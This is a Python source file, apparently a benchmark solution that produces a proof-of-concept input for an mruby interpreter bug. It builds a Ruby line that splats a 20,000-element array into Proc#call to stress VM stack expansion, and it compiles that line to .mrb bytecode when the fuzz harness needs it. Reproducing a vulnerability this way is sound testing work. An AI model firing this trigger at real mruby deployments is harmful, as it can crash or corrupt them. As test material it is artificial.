import os
import re
import tarfile
import tempfile
import shutil
import subprocess
from pathlib import Path
from typing import Optional


def _rb_payload(n: int = 20000) -> bytes:
    # Intentionally stresses VM stack expansion via huge argument splat into Proc#call
    return (f"a=Array.new({n},0);p=Proc.new{{|*x|x[0]}};p.call(*a)\n").encode("utf-8")


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.realpath(path)
    for member in tar.getmembers():
        name = member.name
        if not name or name.startswith("/") or name.startswith("\\"):
            continue
        dest = os.path.realpath(os.path.join(path, name))
        if not (dest == base or dest.startswith(base + os.sep)):
            continue
        tar.extract(member, path=path, set_attrs=False)


def _detect_input_kind_in_bytes(data: bytes) -> Optional[str]:
    d = data
    if b"LLVMFuzzerTestOneInput" in d or b"AFL_LOOP" in d or b"HONGGFUZZ" in d or b"main(" in d:
        # Prefer source-based parsing if clearly present
        if (b"mrb_parse_nstring" in d or b"mrb_parse_string" in d or
            b"mrb_load_nstring" in d or b"mrb_load_string" in d or
            b"mrb_load_string_cxt" in d):
            return "rb"
        if (b"mrb_load_irep" in d or b"mrb_read_irep" in d or
            b"mrb_load_irep_buf" in d or b"mrb_load_irep_cxt" in d):
            return "mrb"
    return None


def _detect_input_kind_from_tar(src_path: str) -> str:
    # Returns "rb" or "mrb" (default "rb" if uncertain)
    try:
        with tarfile.open(src_path, mode="r:*") as tar:
            members = tar.getmembers()

            # Priority pass: fuzz-related files first
            prioritized = []
            others = []
            for m in members:
                if not m.isfile():
                    continue
                name = m.name.lower()
                if any(k in name for k in ("fuzz", "fuzzer", "oss-fuzz", "afl", "honggfuzz")) and (
                    name.endswith((".c", ".cc", ".cpp", ".h")) or "fuzz" in name
                ):
                    prioritized.append(m)
                elif name.endswith((".c", ".cc", ".cpp", ".h")):
                    others.append(m)

            def scan_list(lst, limit_files: int) -> Optional[str]:
                scanned = 0
                for m in lst:
                    if scanned >= limit_files:
                        break
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    try:
                        f = tar.extractfile(m)
                        if not f:
                            continue
                        content = f.read()
                    except Exception:
                        continue
                    scanned += 1
                    kind = _detect_input_kind_in_bytes(content)
                    if kind:
                        return kind
                return None

            kind = scan_list(prioritized, 300)
            if kind:
                return kind
            kind = scan_list(others, 1200)
            if kind:
                return kind
    except Exception:
        pass

    return "rb"


def _find_project_root(extract_dir: str) -> str:
    p = Path(extract_dir)
    # Common: single top-level directory
    children = [c for c in p.iterdir() if c.is_dir()]
    if len(children) == 1:
        candidate = children[0]
        # If this looks like the real root, use it
        if (candidate / "Rakefile").exists() or (candidate / "CMakeLists.txt").exists() or (candidate / "Makefile").exists():
            return str(candidate)

    # Otherwise search for build files
    best = None
    best_score = -1
    for dirpath, dirnames, filenames in os.walk(extract_dir):
        fn = set(filenames)
        score = 0
        if "Rakefile" in fn:
            score += 10
        if "build_config.rb" in fn:
            score += 6
        if "CMakeLists.txt" in fn:
            score += 4
        if "Makefile" in fn:
            score += 3
        if score > best_score:
            best_score = score
            best = dirpath
    return best if best else extract_dir


def _run(cmd, cwd: Optional[str] = None, timeout: int = 240) -> bool:
    try:
        subprocess.run(
            cmd,
            cwd=cwd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=timeout,
            check=True,
        )
        return True
    except Exception:
        return False


def _find_executable(root: str, names) -> Optional[str]:
    # names: list of possible basenames
    rootp = Path(root)
    # Common locations first
    common = [
        rootp / "build" / "host" / "bin",
        rootp / "bin",
        rootp / "build" / "bin",
        rootp / "build",
    ]
    for d in common:
        if d.is_dir():
            for nm in names:
                p = d / nm
                if p.exists() and os.access(str(p), os.X_OK) and p.is_file():
                    return str(p)

    # Full search
    for dirpath, dirnames, filenames in os.walk(root):
        for nm in names:
            if nm in filenames:
                p = os.path.join(dirpath, nm)
                if os.path.isfile(p) and os.access(p, os.X_OK):
                    return p
    return None


def _build_mrbc(project_root: str) -> Optional[str]:
    # Prefer a system mrbc if present
    sys_mrbc = shutil.which("mrbc")
    if sys_mrbc:
        return sys_mrbc

    root = project_root
    has_rakefile = os.path.exists(os.path.join(root, "Rakefile"))
    has_cmake = os.path.exists(os.path.join(root, "CMakeLists.txt"))
    has_make = os.path.exists(os.path.join(root, "Makefile"))

    # MRuby: rake build
    if has_rakefile:
        rake = shutil.which("rake")
        ruby = shutil.which("ruby")
        if rake and ruby:
            # Try faster parallel build first
            if not _run([rake, "-j8"], cwd=root, timeout=420):
                _run([rake], cwd=root, timeout=420)
            mrbc = _find_executable(root, ["mrbc", "mrbc.exe"])
            if mrbc:
                return mrbc

    # CMake build attempt
    if has_cmake:
        build_dir = os.path.join(root, "_poc_build")
        os.makedirs(build_dir, exist_ok=True)
        cmake = shutil.which("cmake")
        make = shutil.which("make")
        if cmake and make:
            if _run([cmake, ".."], cwd=build_dir, timeout=240):
                _run([make, "-j8"], cwd=build_dir, timeout=420)
            mrbc = _find_executable(build_dir, ["mrbc", "mrbc.exe"])
            if mrbc:
                return mrbc
            mrbc = _find_executable(root, ["mrbc", "mrbc.exe"])
            if mrbc:
                return mrbc

    # Makefile build attempt
    if has_make:
        make = shutil.which("make")
        if make:
            _run([make, "-j8"], cwd=root, timeout=420)
            mrbc = _find_executable(root, ["mrbc", "mrbc.exe"])
            if mrbc:
                return mrbc

    return None


def _compile_to_mrb(mrbc_path: str, rb_src: bytes) -> Optional[bytes]:
    with tempfile.TemporaryDirectory(prefix="poc_mrbc_") as td:
        in_rb = os.path.join(td, "poc.rb")
        out_mrb = os.path.join(td, "poc.mrb")
        with open(in_rb, "wb") as f:
            f.write(rb_src)
        # Try common mrbc invocations
        cmds = [
            [mrbc_path, "-o", out_mrb, in_rb],
            [mrbc_path, "-g", "-o", out_mrb, in_rb],
        ]
        ok = False
        for cmd in cmds:
            if _run(cmd, cwd=td, timeout=180):
                ok = True
                break
        if not ok or not os.path.exists(out_mrb):
            return None
        try:
            with open(out_mrb, "rb") as f:
                return f.read()
        except Exception:
            return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        rb = _rb_payload(20000)

        # If source is already a directory, scan it similarly
        kind = "rb"
        if os.path.isfile(src_path):
            kind = _detect_input_kind_from_tar(src_path)
        elif os.path.isdir(src_path):
            # directory: quick heuristic scan for irep loaders in fuzz harnesses
            found = None
            for dirpath, dirnames, filenames in os.walk(src_path):
                for fn in filenames:
                    lfn = fn.lower()
                    if not lfn.endswith((".c", ".cc", ".cpp", ".h")):
                        continue
                    if "fuzz" not in lfn and "fuzz" not in dirpath.lower() and "oss-fuzz" not in dirpath.lower():
                        continue
                    p = os.path.join(dirpath, fn)
                    try:
                        if os.path.getsize(p) > 2_000_000:
                            continue
                        with open(p, "rb") as f:
                            content = f.read()
                    except Exception:
                        continue
                    found = _detect_input_kind_in_bytes(content)
                    if found:
                        break
                if found:
                    break
            kind = found or "rb"

        if kind != "mrb":
            return rb

        # Need .mrb: extract and build mrbc to compile the Ruby payload
        if not os.path.isfile(src_path):
            return rb

        with tempfile.TemporaryDirectory(prefix="poc_src_") as td:
            try:
                with tarfile.open(src_path, mode="r:*") as tar:
                    _safe_extract_tar(tar, td)
            except Exception:
                return rb

            root = _find_project_root(td)
            mrbc = _build_mrbc(root)
            if not mrbc:
                return rb

            mrb = _compile_to_mrb(mrbc, rb)
            if not mrb:
                return rb
            return mrb